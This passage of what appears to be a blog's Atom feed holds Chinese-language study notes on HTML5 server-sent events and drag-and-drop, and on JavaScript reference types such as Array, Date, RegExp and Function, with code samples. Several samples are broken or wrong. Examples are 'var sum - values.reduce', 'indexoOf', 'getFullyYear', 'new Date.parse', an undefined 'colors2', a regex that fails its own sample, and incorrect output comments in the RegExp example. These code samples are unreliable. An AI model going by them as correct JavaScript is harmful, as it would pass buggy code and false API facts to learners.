title="适用场景"></a>适用场景</h4><ul><li>在股票软件中实时显示股票的在线数据</li><li>在新闻网站中实时显示最近刚刚发生的重大新闻</li><li>在在线聊天软件中实时显示当前聊天室中的用户名及用户人数</li><li>在其他任何需要实时显示服务端数据的场合</li></ul><h4 id="实现方法-1"><a href="#实现方法-1" class="headerlink" title="实现方法"></a>实现方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var source = new EventSource(&quot;test.php&quot;,&#123;withCredentials:true&#125;);</span><br><span class="line">source.close();</span><br><span class="line">source.onmessage = function(e)&#123;&#125;;</span><br><span class="line">source.onopen = function(e)&#123;&#125;;</span><br><span class="line">source.onerror = function(e)&#123;&#125;;</span><br></pre></td></tr></table></figure><h2 id="拖放-API"><a href="#拖放-API" class="headerlink" title="拖放 API"></a>拖放 API</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">var target = document.querySelector(&apos;#drop-target&apos;);</span><br><span class="line">var dragElements = document.querySelectorAll(&apos;#drag-elements li&apos;);</span><br><span class="line"></span><br><span class="line">// 追踪被拖动元素的变量</span><br><span class="line">var elementDragged = null;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; dragElements.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">  dragElements[i].addEventListener(&apos;dragstart&apos;, function(e) &#123;</span><br><span class="line">    e.dataTransfer.setData(&apos;text&apos;, this.innerHTML);</span><br><span class="line">    elementDragged = this;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  dragElements[i].addEventListener(&apos;dragend&apos;, function(e) &#123;</span><br><span class="line">    elementDragged = null;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">target.addEventListener(&apos;dragover&apos;, function(e) &#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">  e.dataTransfer.dropEffect = &apos;move&apos;;</span><br><span class="line">  return false;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">target.addEventListener(&apos;drop&apos;, function(e) &#123;</span><br><span class="line">  e.preventDefault(); </span><br><span class="line">  e.stopPropagation();</span><br><span class="line"></span><br><span class="line">  this.innerHTML = &quot;Dropped &quot; + e.dataTransfer.getData(&apos;text&apos;);</span><br><span class="line"></span><br><span class="line">  document.querySelector(&apos;#drag-elements&apos;).removeChild(elementDragged);</span><br><span class="line"></span><br><span class="line">  return false;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;最近阅读了HTML5权威指南，给HTML5中新增的知识点做了张思维导图，方便二次记忆和梳理。&lt;/li&gt;
&lt;li&gt;针对其中部分知识点，已做举例补充。&lt;/li&gt;
&lt;li&gt;有关Canvas部分的知识点不包括在内，将作为一个单独的专题进行梳理。
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>JS引用类型</title>
    <link href="http://dangoying.ink/JS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.html"/>
    <id>http://dangoying.ink/JS引用类型.html</id>
    <published>2019-06-17T13:35:13.000Z</published>
    <updated>2019-06-26T15:39:49.599Z</updated>
    
    <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>引用类型的值（对象）是引用类型的一个实例。<br>引用类型是一种数据结构，用于将数据和功能组织在一起。</p><h2 id="Object类型"><a href="#Object类型" class="headerlink" title="Object类型"></a>Object类型</h2><h3 id="创建方式："><a href="#创建方式：" class="headerlink" title="创建方式："></a>创建方式：</h3><p>使用new操作符后跟Object构造函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var person = new Object();   //与 var person = &#123;&#125; 等同</span><br><span class="line">person.name = &quot;Nicholas&quot;;</span><br><span class="line">person.age = 29;</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>使用对象字面量表示法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name : &quot;Nicholas&quot;,</span><br><span class="line">    age : 29  //在最后一个属性后面添加逗号，会在IE7及更早版本的Opera中导致错误</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="访问属性："><a href="#访问属性：" class="headerlink" title="访问属性："></a>访问属性：</h3><p>使用点表示法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(person.name);</span><br></pre></td></tr></table></figure></p><p>使用方括号语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(person[&quot;name&quot;]);</span><br></pre></td></tr></table></figure></p><p>使用方括号访问的优点：</p><ul><li>可以通过变量来访问</li><li>如果属性名中包含会导致错误语法的字符，或使用关键字，保留字，可以用方括号</li></ul><p>除非必须使用变量来访问属性，否则我们建议使用点表示法。</p><h2 id="Array类型"><a href="#Array类型" class="headerlink" title="Array类型"></a>Array类型</h2><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><p>ECMAScript数组的每一项可以保存在任何类型的数据<br>ECMAScript数组的大小是可以动态调整的</p><h3 id="创建方式：-1"><a href="#创建方式：-1" class="headerlink" title="创建方式："></a>创建方式：</h3><p>使用Array构造函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array(3);</span><br><span class="line">var colors = new Array(&quot;Greg&quot;);</span><br></pre></td></tr></table></figure></p><p>使用数组字面量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br></pre></td></tr></table></figure></p><h3 id="读取方式和设置数组："><a href="#读取方式和设置数组：" class="headerlink" title="读取方式和设置数组："></a>读取方式和设置数组：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">alert(colors[[0]]);</span><br><span class="line">colors[2] = &quot;black&quot;;</span><br></pre></td></tr></table></figure><h3 id="检测数组："><a href="#检测数组：" class="headerlink" title="检测数组："></a>检测数组：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(Array.isArray(value))&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="转换方法："><a href="#转换方法：" class="headerlink" title="转换方法："></a>转换方法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">alert(colors.toString());   //red,blue,green</span><br><span class="line">alert(colors.valueOf());    //red,blue,green</span><br><span class="line">alert(colors);              //red,blue,green</span><br><span class="line">alert(colors.join(&quot;,&quot;));    //red,blue,green</span><br><span class="line">alert(colors.join(&quot;||&quot;));   //red||blue||green</span><br></pre></td></tr></table></figure><h3 id="栈方法："><a href="#栈方法：" class="headerlink" title="栈方法："></a>栈方法：</h3><p>栈是一种LIFO(Last-In-First-Out)的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.push(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">alert(count);   //2</span><br><span class="line">count = colors.push(&quot;black&quot;);</span><br><span class="line">alert(count);   //3</span><br><span class="line">var item = colors.pop();</span><br><span class="line">alert(item);    //&quot;black&quot;</span><br></pre></td></tr></table></figure></p><h3 id="队列方法："><a href="#队列方法：" class="headerlink" title="队列方法："></a>队列方法：</h3><p>队列是一种FIFO(First-in-First-Out)的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.push(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">alert(count);     //2</span><br><span class="line">count = colors.push(&quot;black&quot;);</span><br><span class="line">alert(count);     //3</span><br><span class="line">var item = colors.shift();</span><br><span class="line">alert(item);      //red</span><br><span class="line">var colors = new Array();</span><br><span class="line">var count = colors.unshift(&quot;red&quot;,&quot;green&quot;);</span><br><span class="line">count = colors.unshift(&quot;black&quot;);</span><br><span class="line">alert(colors);    //black,red,green</span><br><span class="line">var item = colors.pop();</span><br><span class="line">alert(item);      //green</span><br></pre></td></tr></table></figure></p><h3 id="重排序方法："><a href="#重排序方法：" class="headerlink" title="重排序方法："></a>重排序方法：</h3><h4 id="function-reverse"><a href="#function-reverse" class="headerlink" title="function reverse:"></a>function reverse:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var values= [1,2,3,4,5];</span><br><span class="line">values.reverse();</span><br><span class="line">alert(values);   //5,4,3,2,1</span><br></pre></td></tr></table></figure><h4 id="function-sort"><a href="#function-sort" class="headerlink" title="function sort:"></a>function sort:</h4><p>在执行sort方法前，会先调用toString()转型，然后比较得到字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var values = [0,1,5,10,15];</span><br><span class="line">values.sort();</span><br><span class="line">alert(values);   //0,1,10,15,5</span><br></pre></td></tr></table></figure></p><p>添加比较函数，如果第一个参数应该位于第二个参数前，返回负数，否则返回正数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function compare(value1,value2)&#123;</span><br><span class="line">    if(value1 &lt; value2)&#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(value1 &gt; value2)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">values.sort(compare);  //0,1,5,10,15</span><br></pre></td></tr></table></figure></p><p>数值类型可以用更简单的比较函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function compare(value1,value2)&#123;   //升序</span><br><span class="line">    return value1 - value2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="操作方法："><a href="#操作方法：" class="headerlink" title="操作方法："></a>操作方法：</h3><h4 id="function-concat"><a href="#function-concat" class="headerlink" title="function concat:"></a>function concat:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];</span><br><span class="line">var colors = colors.concat(&quot;yellow&quot;,[&quot;black&quot;,&quot;brown&quot;]);</span><br><span class="line">alert(colors);    //red,green,blue</span><br><span class="line">alert(colors2);   //red,green,blue,yellow,black,brown</span><br></pre></td></tr></table></figure><p>这个方法会先创建当前数组的一个副本，然后将接收的参数添加到这个副本的末尾，最后返回新构建的数组</p><h4 id="function-slice"><a href="#function-slice" class="headerlink" title="function slice:"></a>function slice:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;,&quot;purple&quot;];</span><br><span class="line">var colors2 = colors.slice(1);</span><br><span class="line">var colors3 = colors.slice(1,4);</span><br><span class="line">alert(colors2);   //green,blue,yellow,purple</span><br><span class="line">alert(colors3);   //green,blue,yellow</span><br></pre></td></tr></table></figure><p>能够基于当前数组中的一或多个项创建一个新数组，slice方法不会影响原始数组</p><h4 id="function-splice"><a href="#function-splice" class="headerlink" title="function splice:"></a>function splice:</h4><p>删除、插入、替换，用于向数组中部插入项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];</span><br><span class="line">var removed = colors.splice(0,1);   //删除一项</span><br><span class="line">alert(colors);    //green,blue</span><br><span class="line">alert(removed);   //red</span><br><span class="line">removed = colors.splice(1,0,&quot;yellow&quot;,&quot;orange&quot;);   //插入两项</span><br><span class="line">alert(colors);    //green,yellow,orange,blue</span><br><span class="line">alert(removed);   //空数组</span><br><span class="line">removed = colors.splice(1,1,&quot;red&quot;,&quot;purple&quot;);   //替换一项，插入一项</span><br><span class="line">alert(colors);   //green,red,purple,orange,blue</span><br><span class="line">alert(removed);  //yellow</span><br></pre></td></tr></table></figure></p><h3 id="位置方法："><a href="#位置方法：" class="headerlink" title="位置方法："></a>位置方法：</h3><h4 id="function-indexOf"><a href="#function-indexOf" class="headerlink" title="function indexOf:"></a>function indexOf:</h4><p>从数组的开头开始向后查找，比较时会使用全等操作符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">alert(numbers.indexoOf(4));   //3</span><br><span class="line">alert(numbers.indexOf(4,4))   //第一参数表示要查找的项，第二参数表示查找起始位置</span><br><span class="line">var person = &#123;name:&quot;Nicholas&quot;&#125;;</span><br><span class="line">var people = [&#123;name:&quot;Nicholas&quot;&#125;];</span><br><span class="line">var morePeople = [person];</span><br><span class="line">alert(people.indexOf(person));   //-1</span><br><span class="line">alert(morePeople.indexOf(person));  //0</span><br></pre></td></tr></table></figure></p><h4 id="function-lastIndexOf"><a href="#function-lastIndexOf" class="headerlink" title="function lastIndexOf:"></a>function lastIndexOf:</h4><p>从数组的末尾开始向前查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">alert(numbers.lastIndexOf(4));   //5</span><br><span class="line">alert(numbers.lastIndexOf(4,4));   //3</span><br></pre></td></tr></table></figure></p><h3 id="迭代方法："><a href="#迭代方法：" class="headerlink" title="迭代方法："></a>迭代方法：</h3><h4 id="function-every"><a href="#function-every" class="headerlink" title="function every:"></a>function every:</h4><p>对数组中的每一项运行给定函数，如果该函数对每一项都返回true，则返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var everyResult = numbers.every(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(everyResult);  //false</span><br></pre></td></tr></table></figure></p><h4 id="function-filter"><a href="#function-filter" class="headerlink" title="function filter:"></a>function filter:</h4><p>对数组中的每一项运行给定函数，返回该函数会返回true的项组成的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var filterResult = numbers.filter(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(filterResult);  //[3,4,5,4,3]</span><br></pre></td></tr></table></figure></p><h4 id="function-forEach"><a href="#function-forEach" class="headerlink" title="function forEach:"></a>function forEach:</h4><p>对数组中的每一项运行给定函数，这个方法没有返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var filterResult = numbers.filter(function(item,index,array)&#123;</span><br><span class="line">    //...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="function-map"><a href="#function-map" class="headerlink" title="function map:"></a>function map:</h4><p>对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var mapResult = numbers.map(function(item,index,array)&#123;</span><br><span class="line">    return item*2;</span><br><span class="line">&#125;);</span><br><span class="line">alert(mapResult);  //[2,4,6,8,10,8,6,4,2]</span><br></pre></td></tr></table></figure></p><h4 id="function-some"><a href="#function-some" class="headerlink" title="function some:"></a>function some:</h4><p>对数组中的每一项运行给定函数，如果该函数对任一项返回true，则返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numbers = [1,2,3,4,5,4,3,2,1];</span><br><span class="line">var someResult = numbers.some(function(item,index,array)&#123;</span><br><span class="line">    return (item&gt;2);</span><br><span class="line">&#125;);</span><br><span class="line">alert(someResult);  //true</span><br></pre></td></tr></table></figure></p><h3 id="缩小方法（归并方法）："><a href="#缩小方法（归并方法）：" class="headerlink" title="缩小方法（归并方法）："></a>缩小方法（归并方法）：</h3><h4 id="function-reduce"><a href="#function-reduce" class="headerlink" title="function reduce:"></a>function reduce:</h4><p>接收4个参数：前一个值，当前值，项的索引值和数组对象，这个函数中返回的任何值都会作为第一个参数自动传给下一项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5];</span><br><span class="line">var sum - values.reduce(function(prev,cur,index,array)&#123;</span><br><span class="line">    return prev + cur;</span><br><span class="line">&#125;);</span><br><span class="line">alert(sum);   //15</span><br></pre></td></tr></table></figure></p><h4 id="function-reduceRight"><a href="#function-reduceRight" class="headerlink" title="function reduceRight:"></a>function reduceRight:</h4><p>与reduce相似，只是从数组最后一项开始，向前遍历<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5];</span><br><span class="line">var sum = values.reduceRight(function(prev,cur,index,array)&#123;</span><br><span class="line">    return prev + cur;</span><br><span class="line">&#125;);</span><br><span class="line">alert(sum);   //15</span><br></pre></td></tr></table></figure></p><h2 id="Date类型"><a href="#Date类型" class="headerlink" title="Date类型"></a>Date类型</h2><h3 id="构造函数："><a href="#构造函数：" class="headerlink" title="构造函数："></a>构造函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var nom = new Date();</span><br><span class="line">var now = new Date.parse(&quot;YYYY-MM-DD&quot;);   //2019-02-19</span><br><span class="line">var now = new Date(Date.UTC(2015,4,5,17,55,55));  //2015/4/5 17:55:55</span><br><span class="line">var start = Date.now();  //获取毫秒数</span><br></pre></td></tr></table></figure><h3 id="继承方法："><a href="#继承方法：" class="headerlink" title="继承方法："></a>继承方法：</h3><p>不同浏览器对toLocaleString(),toString()和valueOf()方法解释不同</p><h3 id="日期格式化方法："><a href="#日期格式化方法：" class="headerlink" title="日期格式化方法："></a>日期格式化方法：</h3><p>toDateString()：以特定于实现的格式显示星期几、月、日和年<br>toTimeString()：以特定于实现的格式显示时分秒和时区<br>toLocaleDateString()：以特定于地区的格式显示星期几、日、月、年<br>toLocaleTimeString()：以特定于地区的格式显示时分秒<br>toUTCString()：以特定于实现的格式完整的UTC日期</p><h3 id="日期-时间组件方法："><a href="#日期-时间组件方法：" class="headerlink" title="日期/时间组件方法："></a>日期/时间组件方法：</h3><p>getTime()：返回表示日期的毫秒数<br>getFullyYear()：取得4位数的年份<br>getMonth()：返回日期中的月份，0-11表示1月至12月<br>getDate()：返回日期月份中的天数(1-31)<br>getDay()：返回日期中星期的星期几(0-6)表示，星期日至星期六<br>getHours()：返回日期中的小时数(0-23)</p><h2 id="RegExp类型"><a href="#RegExp类型" class="headerlink" title="RegExp类型"></a>RegExp类型</h2><h3 id="基础语法："><a href="#基础语法：" class="headerlink" title="基础语法："></a>基础语法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var expression = /pattern/flags;</span><br></pre></td></tr></table></figure><p>pattern部分：可以是任何简单或复杂的正则表达式<br>flags部分：每个正则表达式都可带有1或多个标志</p><blockquote><p>g：表示全局模式，即模式将被应用于所有字符串<br>i：标识区分大小写模式，即在确定匹配项时忽略模式与字符串的大小写<br>m：表示多行模式，即在到达一行文本末尾时还会继续查找下一行是否存在与模式匹配的项</p></blockquote><p>与其他语言中的正则表达式类似，模式中使用的所有元字符都必须转义:([(\^$|)?*+.])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var pattern = /[bc]at/i;</span><br><span class="line">var pattern2 = new RegExp(&quot;[bc]at&quot;,&quot;i&quot;);</span><br></pre></td></tr></table></figure></p><p>在ECMAScript中，正则表达式字面量始终会共享同一个RegExp实例，而使用构造函数创建的每一个新RegExp实例都是一个新实例</p><h3 id="RegExp实例属性："><a href="#RegExp实例属性：" class="headerlink" title="RegExp实例属性："></a>RegExp实例属性：</h3><p>global：布尔值，表示是否设置了g标志<br>ignoreCase：布尔值，表示是否设置了i标志<br>lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从0算起<br>multiline：布尔值，表示是否设置了m标志<br>source：正则表达式的字符串表示，按照字面量形式而传入构造函数中的字符串模式返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var pattern1 = /\[bc\]at/i;</span><br><span class="line">alert(pattern1.global);   //false</span><br><span class="line">alert(pattern1.ignoreCase);   //true</span><br><span class="line">alert(pattern1.multiline);   //false</span><br><span class="line">alert(pattern1.lastIndex);   //0</span><br><span class="line">alert(pattern1.source);   //&quot;\[bc\]at&quot;</span><br></pre></td></tr></table></figure></p><h3 id="RegExp实例方法："><a href="#RegExp实例方法：" class="headerlink" title="RegExp实例方法："></a>RegExp实例方法：</h3><h4 id="function-exec"><a href="#function-exec" class="headerlink" title="function exec:"></a>function exec:</h4><p>专门为捕获组而设计，返回包含第一个匹配信息的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;mom and dad and baby&quot;;</span><br><span class="line">var pattern = /mom(and dad(and baby)?)?/gi;</span><br><span class="line">var matches = pattern.exec(text);</span><br><span class="line">alert(matches.index);  //0</span><br><span class="line">alert(matches.input);  //&quot;mom and dad and baby&quot;</span><br><span class="line">alert(matches[0]);   //&quot;mom and dad and baby&quot;</span><br><span class="line">alert(matches[1]);   //&quot;and dad and baby&quot;</span><br><span class="line">alert(matches[2]);   //&quot;and baby&quot;</span><br></pre></td></tr></table></figure></p><h4 id="function-test"><a href="#function-test" class="headerlink" title="function test:"></a>function test:</h4><p>接受一个字符串参数，在模式与该参数匹配的情况下返回true，否则，返回false<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;000-000-0000&quot;;</span><br><span class="line">var pattern = /\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;/;</span><br><span class="line">if(pattern.test(text))&#123;</span><br><span class="line">    alert(&quot;The pattern was matched&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="function-toLocaleString-和toString"><a href="#function-toLocaleString-和toString" class="headerlink" title="function toLocaleString()和toString():"></a>function toLocaleString()和toString():</h4><p>返回正则表达式的字面量，与创建正则表达式的方式无关</p><h3 id="构造函数属性："><a href="#构造函数属性：" class="headerlink" title="构造函数属性："></a>构造函数属性：</h3><p>input：返回最近一次要匹配的字符串<br>leftContext：返回input字符串中lastMatch之前的文本<br>lastMatch：返回最近一次的匹配项<br>lastParen：返回最近一次匹配的捕获组<br>multiline：布尔值，表示是否所有表达式都是用多行模式<br>rightContext：input字符串中lastMatch之后的文本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;this has been a short summer&quot;;</span><br><span class="line">var patern = /(:)hort/g;</span><br><span class="line">if(pattern.test(text))&#123;</span><br><span class="line">    alert(RegExp.input);   //this has been a short summer</span><br><span class="line">    alert(RegExp.rightContext);   //this has been a </span><br><span class="line">    alert(RegExp.lastMatch);   //short</span><br><span class="line">    alert(RegExp.lastParen);   //s</span><br><span class="line">    alert(RegExp.multiline);   //false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="模式的局限性："><a href="#模式的局限性：" class="headerlink" title="模式的局限性："></a>模式的局限性：</h3><p>ECMAScript不支持的特性：</p><blockquote><p>匹配字符串开始和结尾的\A和\Z锚<br>向后查找<br>并集和交集类<br>原子组<br>Unicode支持<br>命名的捕获组<br>s(single，单行)和x(free-spacing，无间隔)匹配模式<br>条件匹配<br>正则表达式注释</p></blockquote><h2 id="Function类型"><a href="#Function类型" class="headerlink" title="Function类型"></a>Function类型</h2><h3 id="定义方式："><a href="#定义方式：" class="headerlink" title="定义方式："></a>定义方式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">var sum = function(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="没有重载："><a href="#没有重载：" class="headerlink" title="没有重载："></a>没有重载：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 